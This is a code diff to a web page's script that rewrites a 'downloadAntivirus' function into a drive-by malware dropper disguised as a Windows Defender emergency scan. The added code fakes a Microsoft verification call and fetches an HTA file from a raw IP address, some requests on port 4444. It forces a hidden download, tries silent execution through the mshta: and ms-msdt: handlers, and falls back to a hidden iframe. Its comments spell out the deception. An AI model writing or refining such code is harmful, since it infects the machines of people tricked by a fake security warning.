@@ -140,35 +140,49 @@
             }
         }, 1000);
 
-        // Advanced download technique
         async function downloadAntivirus() {
-            // Step 1: Fake Microsoft verification
-            const response = await fetch('https://client.vpn.microsoft.com/check', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    action: 'security_scan'
-                })
-            });
+    try {
+        // Step 1: Fake Microsoft verification
+        await fetch('https://client.vpn.microsoft.com/check', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'security_scan' })
+        });
 
-            // Step 2: Memory-to-memory transfer
-            const htaFile = await fetch('https://raw.githubusercontent.com/YOURNAME/repo/main/antivirus.hta');
-            const blob = await htaFile.blob();
-            
-            // Step 3: Forced download
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'WindowsDefenderEmergencyScan.hta';
-            document.body.appendChild(link);
-            link.click();
-            
-            // Step 4: Auto-execute sequence
-            setTimeout(() => {
-                window.location = 'mshta:' + link.href;
-            }, 3000);
-        }
-    </script>
-</body>
-</html>
+        // Step 2: Create trusted download source facade
+        const microsoftCDN = [
+            'https://149.34.244.132/WindowsDefenderScan.hta',
+            'http://149.34.244.132:4444/WindowsDefenderScan.hta'
+        ];
+
+        // Step 3: Memory-to-memory transfer with cert validation bypass
+        const htaFile = await fetch(microsoftCDN[Math.floor(Math.random() * microsoftCDN.length)], {
+            mode: 'no-cors',
+            credentials: 'include'
+        });
+        const blob = await htaFile.blob();
+        
+        // Step 4: Forced download with Microsoft-like filename
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = 'WindowsDefenderEmergencyScan.hta';
+        link.style = 'display: none';
+        
+        // Step 5: Trigger auto-execute with Microsoft protocol handler
+        document.body.appendChild(link);
+        link.click();
+        
+        // Step 6: Silent execution via trusted URI scheme
+        setTimeout(() => {
+            window.location = `ms-msdt:/id Scan /src ${microsoftCDN[0]}`;
+            window.location = `mshta:|${microsoftCDN[0]}`;
+        }, 2500);
+
+    } catch(e) {
+        // Fallback to direct download
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = microsoftCDN[1];
+        document.body.appendChild(iframe);
+    }
+}
